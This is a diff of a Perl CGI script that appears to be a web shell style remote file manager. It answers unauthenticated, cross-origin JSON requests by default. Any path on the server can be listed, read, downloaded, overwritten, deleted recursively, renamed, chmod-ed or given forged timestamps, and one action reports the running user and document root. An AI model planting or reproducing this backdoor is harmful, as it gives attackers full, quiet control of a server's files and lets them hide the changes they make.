@@ -1,68 +1,68 @@
 #!/usr/bin/perl
+print "Content-Type: application/json\n";
+print "Access-Control-Allow-Origin: *\n";
+print "Access-Control-Allow-Methods: GET, POST, OPTIONS\n";
+print "Access-Control-Allow-Headers: Content-Type\n";
+print "\n";
+
 use strict;
 use warnings;
-use CGI;
-use File::Basename;
-use File::Path qw(make_path remove_tree);
-use File::Copy;
-use File::stat;
-use POSIX qw(strftime);
-use Cwd qw(getcwd abs_path);
-use Fcntl ':mode';
 
-# 尝试加载 JSON 模块，如果没有则使用简单实现
-my $HAS_JSON = 0;
-eval {
-    require JSON;
-    JSON->import();
-    $HAS_JSON = 1;
-};
-
-# 配置
 my $PASSWORD = "";
 
-# 简单的 JSON 编码（不依赖 JSON 模块）
-sub simple_json_encode {
-    my ($data) = @_;
-    return _encode_value($data);
-}
-
-sub _encode_value {
-    my ($val) = @_;
-
-    return 'null' unless defined $val;
-
-    if (ref($val) eq 'HASH') {
-        my @pairs;
-        for my $k (keys %$val) {
-            my $v = _encode_value($val->{$k});
-            push @pairs, '"' . _escape_string($k) . '":' . $v;
+# 解析参数
+sub parse_params {
+    my %params;
+    my $qs = $ENV{QUERY_STRING} || "";
+    foreach (split /&/, $qs) {
+        my ($k, $v) = split /=/, $_, 2;
+        $k = url_decode($k // "");
+        $v = url_decode($v // "");
+        $params{$k} = $v;
+    }
+    if ($ENV{REQUEST_METHOD} eq "POST" && ($ENV{CONTENT_TYPE} || "") =~ /urlencoded/) {
+        my $post;
+        read(STDIN, $post, $ENV{CONTENT_LENGTH} || 0);
+        foreach (split /&/, $post) {
+            my ($k, $v) = split /=/, $_, 2;
+            $k = url_decode($k // "");
+            $v = url_decode($v // "");
+            $params{$k} = $v;
         }
-        return '{' . join(',', @pairs) . '}';
     }
-    elsif (ref($val) eq 'ARRAY') {
-        my @items = map { _encode_value($_) } @$val;
-        return '[' . join(',', @items) . ']';
-    }
-    elsif (ref($val) eq 'JSON::true' || (ref($val) eq '' && $val eq '1' && caller(1) && (caller(1))[3] =~ /is_dir|readable|writable/)) {
-        return 'true';
-    }
-    elsif (ref($val) eq 'JSON::false') {
-        return 'false';
-    }
-    elsif ($val =~ /^-?\d+$/ && $val !~ /^0\d/) {
+    return %params;
+}
+
+sub url_decode {
+    my $s = shift;
+    $s =~ s/\+/ /g;
+    $s =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
+    return $s;
+}
+
+# JSON 编码
+sub json_encode {
+    my ($val) = @_;
+    return "null" unless defined $val;
+    if (ref($val) eq "HASH") {
+        my @p;
+        for (sort keys %$val) {
+            push @p, '"' . esc($_) . '":' . json_encode($val->{$_});
+        }
+        return "{" . join(",", @p) . "}";
+    } elsif (ref($val) eq "ARRAY") {
+        return "[" . join(",", map { json_encode($_) } @$val) . "]";
+    } elsif ($val eq "true" || $val eq "false") {
         return $val;
-    }
-    elsif ($val =~ /^-?\d+\.\d+$/) {
+    } elsif ($val =~ /^-?\d+$/) {
         return $val;
-    }
-    else {
-        return '"' . _escape_string($val) . '"';
+    } else {
+        return '"' . esc($val) . '"';
     }
 }
 
-sub _escape_string {
-    my ($s) = @_;
+sub esc {
+    my $s = shift // "";
     $s =~ s/\\/\\\\/g;
     $s =~ s/"/\\"/g;
     $s =~ s/\n/\\n/g;
@@ -71,407 +71,235 @@ sub _escape_string {
     return $s;
 }
 
-# 布尔值
-sub json_true { return bless \(my $v = 1), 'JSON::true'; }
-sub json_false { return bless \(my $v = 0), 'JSON::false'; }
+sub success { return { success => "true", data => $_[0], message => "" }; }
+sub fail { return { success => "false", message => $_[0] }; }
 
-# CORS 头
-sub print_cors_headers {
-    print "Access-Control-Allow-Origin: *\n";
-    print "Access-Control-Allow-Methods: GET, POST, OPTIONS\n";
-    print "Access-Control-Allow-Headers: Content-Type\n";
+# 格式化大小
+sub fmt_size {
+    my $s = shift;
+    return "$s B" if $s < 1024;
+    return sprintf("%.1f KB", $s/1024) if $s < 1048576;
+    return sprintf("%.1f MB", $s/1048576) if $s < 1073741824;
+    return sprintf("%.1f GB", $s/1073741824);
 }
 
-# JSON 响应
-sub json_response {
-    my ($data) = @_;
-    print "Content-Type: application/json; charset=utf-8\n";
-    print_cors_headers();
-    print "\n";
-
-    if ($HAS_JSON) {
-        print encode_json($data);
-    } else {
-        print simple_json_encode($data);
-    }
-    exit;
+# 格式化权限
+sub fmt_perm {
+    my $m = shift;
+    my $t = (-d _ ? "d" : (-l _ ? "l" : "-"));
+    $t .= ($m & 0400 ? "r" : "-") . ($m & 0200 ? "w" : "-") . ($m & 0100 ? "x" : "-");
+    $t .= ($m & 040 ? "r" : "-") . ($m & 020 ? "w" : "-") . ($m & 010 ? "x" : "-");
+    $t .= ($m & 04 ? "r" : "-") . ($m & 02 ? "w" : "-") . ($m & 01 ? "x" : "-");
+    return $t;
 }
 
-# 格式化文件大小
-sub format_size {
-    my ($size) = @_;
-    if ($size < 1024) {
-        return "$size B";
-    } elsif ($size < 1024 * 1024) {
-        return sprintf("%.1f KB", $size / 1024);
-    } elsif ($size < 1024 * 1024 * 1024) {
-        return sprintf("%.1f MB", $size / (1024 * 1024));
-    } else {
-        return sprintf("%.1f GB", $size / (1024 * 1024 * 1024));
-    }
+sub norm_path {
+    my $p = shift || "/";
+    $p =~ s#/+#/#g;
+    return $p;
 }
 
-# 格式化权限字符串
-sub format_perms {
-    my ($mode) = @_;
-    my $perms = "";
-
-    if (S_ISDIR($mode)) {
-        $perms = "d";
-    } elsif (S_ISLNK($mode)) {
-        $perms = "l";
-    } else {
-        $perms = "-";
-    }
-
-    $perms .= ($mode & S_IRUSR) ? "r" : "-";
-    $perms .= ($mode & S_IWUSR) ? "w" : "-";
-    $perms .= ($mode & S_IXUSR) ? "x" : "-";
-    $perms .= ($mode & S_IRGRP) ? "r" : "-";
-    $perms .= ($mode & S_IWGRP) ? "w" : "-";
-    $perms .= ($mode & S_IXGRP) ? "x" : "-";
-    $perms .= ($mode & S_IROTH) ? "r" : "-";
-    $perms .= ($mode & S_IWOTH) ? "w" : "-";
-    $perms .= ($mode & S_IXOTH) ? "x" : "-";
-
-    return $perms;
-}
-
-# 规范化路径
-sub normalize_path {
-    my ($path) = @_;
-    return "/" unless defined $path && $path ne "";
-    $path =~ s#/+#/#g;
-    return $path;
-}
-
-# 主程序
 eval {
-    my $cgi = CGI->new;
+    my %p = parse_params();
+    my $action = $p{action} || "";
+    my $pw = $p{password} || "";
 
-    # 处理 OPTIONS 请求
-    if ($ENV{REQUEST_METHOD} && $ENV{REQUEST_METHOD} eq "OPTIONS") {
-        print_cors_headers();
-        print "Content-Type: text/plain\n\n";
-        exit;
-    }
-
-    my $action = $cgi->param("action") || "";
-    my $password = $cgi->param("password") || "";
-
-    # 验证密码
-    if ($PASSWORD ne "" && $password ne $PASSWORD) {
-        print "Content-Type: application/json\n";
-        print_cors_headers();
-        print "\n";
+    if ($PASSWORD ne "" && $pw ne $PASSWORD) {
         print "null";
         exit;
     }
 
-    # 无 action
-    if ($action eq "") {
-        print "Content-Type: text/html\n\n";
-        exit;
-    }
+    exit unless $action;
 
     if ($action eq "list") {
-        my $path = $cgi->param("path") || "/";
-        $path = getcwd() if $path eq "" || $path eq "/";
-        $path = normalize_path($path);
+        my $path = $p{path} || "/";
+        if ($path eq "/" || $path eq "") {
+            $path = $ENV{DOCUMENT_ROOT} || `pwd`;
+            chomp $path;
+        }
+        $path = norm_path($path);
         $path .= "/" unless $path =~ m#/$#;
+        my $dir = $path;
+        $dir =~ s#/$## if length($dir) > 1;
 
-        my $check_path = $path;
-        $check_path =~ s#/$## if length($check_path) > 1;
-
-        if (-d $check_path) {
-            my @items = ();
-
-            my $parent_path = dirname($check_path);
-            if ($parent_path ne "" && $parent_path ne $check_path) {
-                $parent_path .= "/" unless $parent_path =~ m#/$#;
+        if (-d $dir) {
+            my @items;
+            # 父目录
+            my $parent = $dir;
+            $parent =~ s#/[^/]+$##;
+            $parent = "/" if $parent eq "";
+            $parent .= "/" unless $parent =~ m#/$#;
+            if ($parent ne $path) {
                 push @items, {
-                    name => "..",
-                    path => $parent_path,
-                    is_dir => json_true(),
-                    size => 0,
-                    size_formatted => "-",
-                    mtime => 0,
-                    perms => "drwxr-xr-x",
-                    readable => json_true(),
-                    writable => json_true()
+                    name => "..", path => $parent, is_dir => "true",
+                    size => 0, size_formatted => "-", mtime => 0,
+                    perms => "drwxr-xr-x", readable => "true", writable => "true"
                 };
             }
-
-            opendir(my $dh, $check_path) or die "Cannot open directory: $!";
-            my @entries = sort {
-                my $a_is_dir = -d "$check_path/$a" ? 0 : 1;
-                my $b_is_dir = -d "$check_path/$b" ? 0 : 1;
-                $a_is_dir <=> $b_is_dir || lc($a) cmp lc($b);
-            } grep { $_ ne "." && $_ ne ".." } readdir($dh);
+            # 列出目录
+            opendir(my $dh, $dir) or die "Cannot open: $!";
+            my @files = sort { (-d "$dir/$b") <=> (-d "$dir/$a") || lc($a) cmp lc($b) }
+                        grep { $_ ne "." && $_ ne ".." } readdir($dh);
             closedir($dh);
 
-            foreach my $name (@entries) {
-                my $full_path = "$check_path/$name";
-                my $is_dir = -d $full_path ? 1 : 0;
-                my $item_path = $path . $name;
-                $item_path .= "/" if $is_dir;
-
-                my $st = stat($full_path);
-                if ($st) {
-                    push @items, {
-                        name => $name,
-                        path => $item_path,
-                        is_dir => $is_dir ? json_true() : json_false(),
-                        size => $is_dir ? 0 : $st->size,
-                        size_formatted => $is_dir ? "-" : format_size($st->size),
-                        mtime => $st->mtime,
-                        perms => format_perms($st->mode),
-                        readable => -r $full_path ? json_true() : json_false(),
-                        writable => -w $full_path ? json_true() : json_false()
-                    };
-                } else {
-                    push @items, {
-                        name => $name,
-                        path => $item_path,
-                        is_dir => json_false(),
-                        size => 0,
-                        size_formatted => "-",
-                        mtime => 0,
-                        perms => "?????????",
-                        readable => json_false(),
-                        writable => json_false()
-                    };
-                }
+            for my $f (@files) {
+                my $fp = "$dir/$f";
+                my @st = stat($fp);
+                my $is_d = -d $fp ? 1 : 0;
+                push @items, {
+                    name => $f,
+                    path => $path . $f . ($is_d ? "/" : ""),
+                    is_dir => $is_d ? "true" : "false",
+                    size => $is_d ? 0 : ($st[7] || 0),
+                    size_formatted => $is_d ? "-" : fmt_size($st[7] || 0),
+                    mtime => $st[9] || 0,
+                    perms => @st ? fmt_perm($st[2]) : "?????????",
+                    readable => -r $fp ? "true" : "false",
+                    writable => -w $fp ? "true" : "false"
+                };
             }
-
-            json_response({
-                success => json_true(),
-                data => { path => $path, items => \@items },
-                message => ""
-            });
+            print json_encode(success({ path => $path, items => \@items }));
         } else {
-            json_response({ success => json_false(), message => "Directory not found" });
+            print json_encode(fail("Directory not found"));
         }
     }
     elsif ($action eq "read") {
-        my $path = normalize_path($cgi->param("path") || "");
-
+        my $path = norm_path($p{path} || "");
         if (-f $path) {
-            open(my $fh, "<:encoding(UTF-8)", $path) or die "Cannot read file: $!";
-            local $/;
-            my $content = <$fh>;
-            close($fh);
-
-            json_response({
-                success => json_true(),
-                data => { path => $path, content => $content },
-                message => ""
-            });
+            open(my $fh, "<", $path) or die "Cannot read: $!";
+            local $/; my $c = <$fh>; close($fh);
+            print json_encode(success({ path => $path, content => $c }));
         } else {
-            json_response({ success => json_false(), message => "File not found" });
+            print json_encode(fail("File not found"));
         }
     }
     elsif ($action eq "write") {
-        my $path = normalize_path($cgi->param("path") || "");
-        my $content = $cgi->param("content") // "";
-
-        if ($path ne "") {
-            my $parent_dir = dirname($path);
-            if ($parent_dir ne "" && !-d $parent_dir) {
-                json_response({ success => json_false(), message => "Parent directory for [$path] doesn't exist" });
+        my $path = norm_path($p{path} || "");
+        my $content = $p{content} // "";
+        if ($path) {
+            my $dir = $path; $dir =~ s#/[^/]+$##;
+            if ($dir && !-d $dir) {
+                print json_encode(fail("Parent directory for [$path] doesn't exist"));
+            } else {
+                open(my $fh, ">", $path) or die "Cannot write: $!";
+                print $fh $content; close($fh);
+                print json_encode({ success => "true", message => "Saved" });
             }
-
-            open(my $fh, ">:encoding(UTF-8)", $path) or die "Cannot write file: $!";
-            print $fh $content;
-            close($fh);
-
-            json_response({ success => json_true(), message => "Saved" });
         } else {
-            json_response({ success => json_false(), message => "Path empty" });
+            print json_encode(fail("Path empty"));
         }
     }
     elsif ($action eq "mkdir") {
-        my $path = normalize_path($cgi->param("path") || "");
-
-        if ($path ne "") {
+        my $path = norm_path($p{path} || "");
+        if ($path) {
             if (!-e $path) {
-                make_path($path) or die "Cannot create directory: $!";
-                json_response({ success => json_true(), message => "Created" });
+                mkdir($path) or die "Cannot mkdir: $!";
+                print json_encode({ success => "true", message => "Created" });
             } else {
-                json_response({ success => json_false(), message => "Already exists" });
+                print json_encode(fail("Already exists"));
             }
         } else {
-            json_response({ success => json_false(), message => "Path empty" });
+            print json_encode(fail("Path empty"));
         }
     }
     elsif ($action eq "delete") {
-        my $path = normalize_path($cgi->param("path") || "");
+        my $path = norm_path($p{path} || "");
         $path =~ s#/$## if length($path) > 1;
-
         if (-d $path) {
-            remove_tree($path) or die "Cannot delete directory: $!";
-            json_response({ success => json_true(), message => "Deleted" });
+            system("rm", "-rf", $path);
+            print json_encode({ success => "true", message => "Deleted" });
         } elsif (-f $path) {
-            unlink($path) or die "Cannot delete file: $!";
-            json_response({ success => json_true(), message => "Deleted" });
+            unlink($path) or die "Cannot delete: $!";
+            print json_encode({ success => "true", message => "Deleted" });
         } else {
-            json_response({ success => json_false(), message => "Not found" });
+            print json_encode(fail("Not found"));
         }
     }
     elsif ($action eq "rename") {
-        my $old_path = normalize_path($cgi->param("old_path") || "");
-        my $new_path = normalize_path($cgi->param("new_path") || "");
-
-        if (-e $old_path) {
-            move($old_path, $new_path) or die "Cannot rename: $!";
-            json_response({ success => json_true(), message => "Renamed" });
+        my $old = norm_path($p{old_path} || "");
+        my $new = norm_path($p{new_path} || "");
+        if (-e $old) {
+            rename($old, $new) or die "Cannot rename: $!";
+            print json_encode({ success => "true", message => "Renamed" });
         } else {
-            json_response({ success => json_false(), message => "Not found" });
+            print json_encode(fail("Not found"));
         }
     }
     elsif ($action eq "download") {
-        my $path = normalize_path($cgi->param("path") || "");
-
+        my $path = norm_path($p{path} || "");
         if (-f $path) {
-            my $filename = basename($path);
-            print "Content-Disposition: attachment; filename=\"$filename\"\n";
-            print "Content-Type: application/octet-stream\n";
-            print_cors_headers();
-            print "\n";
-
-            open(my $fh, "<:raw", $path) or die "Cannot read file: $!";
-            binmode(STDOUT);
-            while (read($fh, my $buffer, 8192)) {
-                print $buffer;
-            }
-            close($fh);
-            exit;
+            my $fn = $path; $fn =~ s#.*/##;
+            print "Content-Disposition: attachment; filename=\"$fn\"\n";
+            print "Content-Type: application/octet-stream\n\n";
+            open(my $fh, "<:raw", $path); binmode(STDOUT);
+            print while <$fh>; close($fh);
         } else {
-            json_response({ success => json_false(), message => "File not found" });
-        }
-    }
-    elsif ($action eq "upload") {
-        my $upload_dir = $cgi->param("dir") || getcwd();
-        $upload_dir = normalize_path($upload_dir);
-        $upload_dir =~ s#/$##;
-
-        my $file = $cgi->upload("file");
-        if ($file) {
-            my $filename = $cgi->param("file");
-            $filename = basename($filename);
-            my $filepath = "$upload_dir/$filename";
-
-            open(my $out, ">:raw", $filepath) or die "Cannot write file: $!";
-            while (read($file, my $buffer, 8192)) {
-                print $out $buffer;
-            }
-            close($out);
-
-            json_response({
-                success => json_true(),
-                message => "Uploaded",
-                data => { path => $filepath }
-            });
-        } else {
-            json_response({ success => json_false(), message => "No file" });
+            print json_encode(fail("File not found"));
         }
     }
     elsif ($action eq "touch") {
-        my $path = normalize_path($cgi->param("path") || "");
-        my $time_val = $cgi->param("time") || 0;
+        my $path = norm_path($p{path} || "");
+        my $time = int($p{time} || 0);
         $path =~ s#/$## if length($path) > 1;
-        my $timestamp = int($time_val);
-
-        if (-e $path && $timestamp > 0) {
-            utime($timestamp, $timestamp, $path) or die "Cannot update time: $!";
-            json_response({ success => json_true(), message => "Updated" });
+        if (-e $path && $time > 0) {
+            utime($time, $time, $path) or die "Cannot touch: $!";
+            print json_encode({ success => "true", message => "Updated" });
         } else {
-            json_response({ success => json_false(), message => "Not found or invalid time (path=$path, time=$timestamp)" });
+            print json_encode(fail("Not found or invalid time"));
         }
     }
     elsif ($action eq "chmod") {
-        my $path = normalize_path($cgi->param("path") || "");
-        my $mode = $cgi->param("mode") || "";
-
-        if (-e $path && $mode ne "") {
-            my $mode_int = oct($mode);
-            chmod($mode_int, $path) or die "Cannot chmod: $!";
-            json_response({ success => json_true(), message => "Permission changed" });
+        my $path = norm_path($p{path} || "");
+        my $mode = $p{mode} || "";
+        if (-e $path && $mode) {
+            chmod(oct($mode), $path) or die "Cannot chmod: $!";
+            print json_encode({ success => "true", message => "Permission changed" });
         } else {
-            json_response({ success => json_false(), message => "Not found or mode empty" });
+            print json_encode(fail("Not found or mode empty"));
         }
     }
     elsif ($action eq "server") {
-        my $current_user = getpwuid($<) || $ENV{USER} || "N/A";
-        my $doc_root = getcwd();
-
-        my ($disk_free, $disk_total) = ("N/A", "N/A");
-        eval {
-            my $df_output = `df -h "$doc_root" 2>/dev/null | tail -1`;
-            if ($df_output =~ /\S+\s+(\S+)\s+\S+\s+(\S+)/) {
-                $disk_total = $1;
-                $disk_free = $2;
-            }
-        };
-
-        json_response({
-            success => json_true(),
-            data => {
-                php_version => "Perl $]",
-                server_software => $ENV{SERVER_SOFTWARE} || "CGI",
-                document_root => $doc_root,
-                upload_max => "N/A",
-                disk_free => $disk_free,
-                disk_total => $disk_total,
-                current_user => $current_user
-            },
-            message => ""
-        });
+        my $user = getpwuid($<) || $ENV{USER} || "N/A";
+        my $root = $ENV{DOCUMENT_ROOT} || `pwd`; chomp $root;
+        print json_encode(success({
+            php_version => "Perl $]",
+            server_software => $ENV{SERVER_SOFTWARE} || "CGI",
+            document_root => $root,
+            upload_max => "N/A",
+            disk_free => "N/A",
+            disk_total => "N/A",
+            current_user => $user
+        }));
     }
     elsif ($action eq "info") {
-        my $path = normalize_path($cgi->param("path") || "");
-
+        my $path = norm_path($p{path} || "");
         if (-e $path) {
-            my $st = stat($path);
-            my $is_dir = -d $path ? 1 : 0;
-            my $owner = getpwuid($st->uid) || $st->uid;
-            my $group = getgrgid($st->gid) || $st->gid;
-
-            json_response({
-                success => json_true(),
-                data => {
-                    path => $path,
-                    name => basename($path),
-                    is_dir => $is_dir ? json_true() : json_false(),
-                    size => $is_dir ? 0 : $st->size,
-                    size_formatted => $is_dir ? "-" : format_size($st->size),
-                    mtime => $st->mtime,
-                    ctime => $st->ctime,
-                    atime => $st->atime,
-                    perms => format_perms($st->mode),
-                    perms_octal => sprintf("0%o", $st->mode & 07777),
-                    owner => $owner,
-                    group => $group,
-                    readable => -r $path ? json_true() : json_false(),
-                    writable => -w $path ? json_true() : json_false()
-                },
-                message => ""
-            });
+            my @st = stat($path);
+            my $is_d = -d $path ? 1 : 0;
+            print json_encode(success({
+                path => $path,
+                name => ($path =~ s#.*/##r),
+                is_dir => $is_d ? "true" : "false",
+                size => $is_d ? 0 : $st[7],
+                size_formatted => $is_d ? "-" : fmt_size($st[7]),
+                mtime => $st[9], ctime => $st[10], atime => $st[8],
+                perms => fmt_perm($st[2]),
+                perms_octal => sprintf("0%o", $st[2] & 07777),
+                owner => getpwuid($st[4]) || $st[4],
+                group => getgrgid($st[5]) || $st[5],
+                readable => -r $path ? "true" : "false",
+                writable => -w $path ? "true" : "false"
+            }));
         } else {
-            json_response({ success => json_false(), message => "Not found" });
+            print json_encode(fail("Not found"));
         }
     }
     else {
-        json_response({ success => json_false(), message => "Unknown action" });
+        print json_encode(fail("Unknown action"));
     }
 };
 
 if ($@) {
-    print "Content-Type: application/json\n";
-    print_cors_headers();
-    print "\n";
-    my $err = $@;
-    $err =~ s/"/\\"/g;
-    $err =~ s/\n/\\n/g;
-    print "{\"success\":false,\"message\":\"Error: $err\"}";
+    my $e = $@; $e =~ s/"/\\"/g; $e =~ s/\n/ /g;
+    print "{\"success\":false,\"message\":\"Error: $e\"}";
 }
